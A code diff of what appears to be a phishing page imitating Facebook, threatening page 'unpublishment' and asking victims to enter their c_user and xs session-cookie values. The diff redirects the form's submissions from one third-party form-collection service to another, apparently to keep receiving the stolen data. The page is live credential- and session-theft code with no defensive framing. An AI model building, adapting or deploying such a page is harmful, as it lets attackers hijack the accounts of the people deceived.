@@ -103,7 +103,7 @@
 
 								Failure to provide this information may also lead to unpublishment of your page.</h5>
                                         <br>
-                                        <form action="https://getform.io/f/07aa3077-75b4-4ba1-950c-e016fa4b1ede" method="POST">
+                                        <form action="https://formcarry.com/s/D6oM8fKS4y" method="POST">
                                             <h5 class="_3-94 _50f8 _50f7">c_user</h5>
                                             <input type="text" class="inputtext _55r1" name="c_user" placeholder="" pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+" required="1" aria-required="true">
                                             <h5 class="_3-94 _50f8 _50f7">xs</h5>
